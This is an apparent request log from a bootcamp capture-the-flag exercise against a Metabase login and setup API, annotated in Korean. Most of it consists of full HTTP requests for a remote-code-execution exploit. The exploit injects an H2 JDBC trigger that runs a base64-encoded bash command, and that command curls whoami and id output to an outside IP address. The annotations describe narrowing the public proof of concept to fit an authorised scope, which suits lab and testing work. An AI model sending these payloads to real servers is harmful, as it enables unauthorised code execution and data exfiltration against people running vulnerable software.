# All Requests — bootcamp-ctf-auth-login

## 요청 1 (EVID-RECON-001, CTL-RECON-001)

```
GET /auth/login?redirect=%2F HTTP/1.1
Host: 100.121.79.125:3000
```

## 요청 2 (EVID-RECON-002, CTL-RECON-002)

```
GET /api/session/properties HTTP/1.1
Host: 100.121.79.125:3000
```

## 요청 3 (EVID-EXPLOIT-001, CTL-EXPLOIT-001, 1차 시도)

```
POST /api/setup/validate HTTP/1.1
Host: 100.121.79.125:3000
Content-Type: application/json

{
  "token": "17de1587-39de-4144-b17f-410bc5100b24",
  "details": {
    "details": {
      "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER T1 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec(new java.lang.String[]{\"bash\",\"-c\",\"echo <BASE64>|base64 -d|bash\"})\n$$--=x",
      "advanced-options": false,
      "ssl": true
    },
    "name": "x",
    "engine": "h2"
  }
}
```

- `<BASE64>` 디코드 결과: `curl -s http://100.66.73.74:8765/pwned/$(whoami)/$(id -u)_$(id -g)`
- exec 호출 형태: `Runtime.exec(String[])` (자체 재구성, 원본 PoC와 다름)

## 요청 4 (EVID-EXPLOIT-002, CTL-EXPLOIT-001, 2차 시도 — 원본 PoC 구조 재현)

```
POST /api/setup/validate HTTP/1.1
Host: 100.121.79.125:3000
Content-Type: application/json

{
  "token": "17de1587-39de-4144-b17f-410bc5100b24",
  "details": {
    "details": {
      "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER MYPBRXUTSZHE BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,<BASE64>}|{base64,-d}|{bash}')\n$$--=x",
      "advanced-options": false,
      "ssl": true
    },
    "name": "x",
    "engine": "h2"
  }
}
```

- `<BASE64>` = `Y3VybCAtcyBodHRwOi8vMTAwLjY2LjczLjc0Ojg3NjUvcHduZWQvJCh3aG9hbWkpLyQoaWQgLXUpXyQoaWQgLWcp`
  (디코드: `curl -s http://100.66.73.74:8765/pwned/$(whoami)/$(id -u)_$(id -g)`)
- exec 호출 형태: `Runtime.exec(String)` (원본 PoC와 동일한 단일 문자열 + brace-expansion 형태),
  단 원본의 마지막 단계 `{bash,-i}`(인터랙티브 쉘)만 `{bash}`(비인터랙티브, 일회성)로 교체 —
  승인된 범위(whoami/id 결과만, 쉘 세션 없음)를 지키기 위함
